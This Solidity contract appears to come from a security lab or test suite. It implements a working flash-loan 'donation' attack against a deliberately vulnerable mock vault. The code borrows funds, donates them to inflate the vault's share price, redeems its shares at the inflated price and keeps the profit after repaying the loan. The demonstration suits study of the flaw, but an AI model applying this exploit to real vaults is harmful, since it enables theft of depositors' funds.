// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./D23_MockERC20.sol";
import "./FlashLenderMock.sol";
import "./VulnVaultDonation.sol";

/// @title AttackDonation
/// @notice Demonstrates same-tx "donation" manipulation using a flash loan:
///         1) attacker holds tiny shares
///         2) flash borrow huge
///         3) donate borrowed assets into vault => totalAssets up, share price up
///         4) redeem attacker's shares for inflated assets
///         5) repay flash loan + fee, keep profit
contract AttackDonation is IFlashBorrower {
    MockERC20 public immutable asset;
    FlashLenderMock public immutable lender;
    VulnVaultDonation public immutable vault;
    address public immutable owner;

    error NotOwner();

    constructor(
        MockERC20 _asset,
        FlashLenderMock _lender,
        VulnVaultDonation _vault
    ) {
        asset = _asset;
        lender = _lender;
        vault = _vault;
        owner = msg.sender;
    }

    function run(uint256 flashAmount) external {
        if (msg.sender != owner) revert NotOwner();
        lender.flashLoan(this, flashAmount, bytes(""));
        // profit stays in this contract; owner can withdraw
    }

    function onFlashLoan(
        address /*initiator*/,
        address /*assetAddr*/,
        uint256 amount,
        uint256 fee,
        bytes calldata /*data*/
    ) external override {
        require(msg.sender == address(lender), "only lender");

        // 1) donate all borrowed funds into the vault (manipulates totalAssets)
        asset.transfer(address(vault), amount);

        // 2) redeem all shares this contract holds at manipulated price
        uint256 shares = vault.balanceOf(address(this));
        if (shares > 0) {
            vault.redeem(shares, address(this), address(this));
        }

        // 3) repay loan + fee
        asset.transfer(address(lender), amount + fee);
    }

    function withdrawProfit(address to) external {
        if (msg.sender != owner) revert NotOwner();
        uint256 bal = asset.balanceOf(address(this));
        asset.transfer(to, bal);
    }
}
